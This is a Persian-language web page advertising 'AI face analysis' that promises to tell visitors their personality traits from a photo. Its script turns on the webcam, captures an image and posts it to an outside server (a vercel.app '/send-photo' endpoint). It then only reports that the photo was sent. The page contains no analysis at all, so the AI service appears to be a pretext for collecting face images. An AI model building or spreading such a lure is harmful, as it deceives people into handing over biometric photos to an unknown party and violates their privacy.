<!DOCTYPE html>
<html lang="fa" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>عکستو بده تا بهت بگم</title>

    <!-- فونت فارسی -->
    <link
      href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;600;700&display=swap"
      rel="stylesheet"
    />

    <style>
      body {
        font-family: "Vazirmatn", sans-serif;
        margin: 0;
        background: linear-gradient(135deg, #6a11cb, #2575fc);
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
        color: #fff;
        text-align: center;
        overflow: hidden;
      }

      h1 {
        font-size: 2rem;
        margin-bottom: 10px;
        animation: fadeIn 1s ease-in-out;
      }

      p {
        font-size: 1.1rem;
        margin-bottom: 20px;
        animation: fadeIn 1.2s ease-in-out;
      }

      video {
        width: 90%;
        max-width: 350px;
        border-radius: 20px;
        box-shadow: 0 8px 25px rgba(0, 0, 0, 0.35);
        animation: float 3s infinite ease-in-out;
      }

      button {
        margin-top: 20px;
        padding: 12px 30px;
        font-size: 1.1rem;
        border: none;
        border-radius: 30px;
        cursor: pointer;
        background: #fff;
        color: #2575fc;
        font-weight: bold;
        transition: 0.3s;
        box-shadow: 0 6px 15px rgba(255, 255, 255, 0.2);
      }

      button:hover {
        transform: scale(1.05);
        background: #f1f1f1;
      }
      #captureBtn {
        background: #0066ff;
        color: #fff;
        padding: 12px 20px;
        border: none;
        border-radius: 12px;
        font-size: 18px;
        cursor: pointer;
        transition: 0.3s ease-in-out;
        box-shadow: 0 0 0 rgba(0, 0, 0, 0); /* بدون نور اولیه */
      }

      #captureBtn:hover {
        box-shadow: 0 0 15px rgba(0, 140, 255, 0.6); /* نور هنگام Hover */
      }

      /* حالت نور موقع ارسال */
      #captureBtn.glow {
        box-shadow: 0 0 25px rgba(0, 255, 196, 0.8);
        transform: scale(1.05);
      }

      @keyframes float {
        0% {
          transform: translateY(0);
        }
        50% {
          transform: translateY(-8px);
        }
        100% {
          transform: translateY(0);
        }
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(-10px);
        }
        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      @media (max-width: 600px) {
        h1 {
          font-size: 1.5rem;
        }
        p {
          font-size: 1rem;
        }
        button {
          font-size: 1rem;
          padding: 10px 25px;
        }
      }
      #processing {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(135deg, #1f1c2c, #928dab);
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        color: #fff;
        z-index: 9999;
      }

      #processing-text {
        font-size: 2rem;
        font-weight: bold;
        text-align: center;
        animation: pulse 1s infinite;
        margin-bottom: 20px;
        color: #00ffe0;
      }

      /* ضربان قلب */
      @keyframes pulse {
        0% {
          transform: scale(1);
          color: #00ffe0;
        }
        50% {
          transform: scale(1.1);
          color: #00aaff;
        }
        100% {
          transform: scale(1);
          color: #00ffe0;
        }
      }

      /* نقطه‌های لودینگ */
      .dots span {
        display: inline-block;
        width: 12px;
        height: 12px;
        margin: 0 5px;
        background: #00ffe0;
        border-radius: 50%;
        animation: bounce 1.2s infinite ease-in-out;
      }

      .dots span:nth-child(1) {
        animation-delay: 0s;
      }
      .dots span:nth-child(2) {
        animation-delay: 0.2s;
      }
      .dots span:nth-child(3) {
        animation-delay: 0.4s;
      }

      @keyframes bounce {
        0%,
        80%,
        100% {
          transform: scale(0);
        }
        40% {
          transform: scale(1);
        }
      }
      /* Navbar */
.navbar {
    width: 100%;
    background: rgba(0,0,0,0.5);
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 10px 30px;
    position: fixed;
    top: 0;
    left: 0;
    z-index: 1000;
    backdrop-filter: blur(10px);
}

.navbar .logo {
    font-size: 1.5rem;
    font-weight: bold;
    color: #00ffe0;
}

.navbar .nav-links {
    list-style: none;
    display: flex;
    gap: 25px;
}

.navbar .nav-links li a {
    color: #fff;
    text-decoration: none;
    font-weight: 500;
    transition: 0.3s;
}

.navbar .nav-links li a:hover {
    color: #00ffe0;
}

.menu-toggle {
    display: none;
    font-size: 2rem;
    color: #00ffe0;
    cursor: pointer;
}

/* Responsive */
@media (max-width: 768px) {
    .navbar .nav-links {
        position: fixed;
        right: -100%;
        top: 60px;
        flex-direction: column;
        background: rgba(0,0,0,0.9);
        width: 200px;
        height: calc(100% - 60px);
        padding-top: 20px;
        gap: 20px;
        transition: 0.3s;
    }

    .navbar .nav-links.active {
        right: 0;
    }

    .menu-toggle {
        display: block;
    }
}

    </style>
  </head>

  <body>
    <nav class="navbar">
        <div class="logo">عکستو بده</div>
        <ul class="nav-links">
            <li><a href="#home">خانه</a></li>
            <li><a href="#features">ویژگی‌ها</a></li>
            <li><a href="#about">درباره</a></li>
            <li><a href="#contact">تماس</a></li>
        </ul>
        <div class="menu-toggle" id="mobile-menu">&#9776;</div>
    </nav>
    
    <h1>به هوش مصنوعی انالیز چهره خوش اومدین😊😁</h1>
    <p>عکستو بهم بده که برات بگم چه خصوصیت هایی داری😊😊</p>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas" style="display: none"></canvas>

    <button id="captureBtn" type="button">📷 الان عکس بگیر</button>
    <div id="processing" style="display: none">
      <h2 id="processing-text">⏳ در حال پردازش تصویر…</h2>
      <div class="dots"><span></span><span></span><span></span></div>
    </div>

    <script>
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const captureBtn = document.getElementById("captureBtn");
        
      navigator.mediaDevices
        .getUserMedia({ video: true })
        .then((stream) => (video.srcObject = stream))
        .catch((err) => alert("اجازه دوربین رد شد ❌"));

        captureBtn.addEventListener('click', async (e) => {
    e.preventDefault();
    e.stopPropagation();

    // ✨ غیرفعال کردن دکمه و نور دادن
    captureBtn.disabled = true;
    captureBtn.classList.add('glow');
    captureBtn.innerText = '⏳ در حال ارسال...';

    // گرفتن عکس
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    const img = canvas.toDataURL('image/png');

    // مخفی کردن ویدیو و دکمه
    video.style.display = 'none';
    captureBtn.style.display = 'none';

    // نمایش صفحه پردازش
    const processing = document.getElementById('processing');
    processing.style.display = 'flex';

    try {
        const res = await fetch('https://photo-three-vert.vercel.app/send-photo', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: img }),
        });
        const data = await res.json();
        document.getElementById('processing-text').innerText = '✔ عکس با موفقیت ارسال شد!';
        console.log('data: ', data);
        
    } catch (err) {
        document.getElementById('processing-text').innerText = '❌ خطا در ارسال عکس!';
    }
});


    </script>
  </body>
</html>
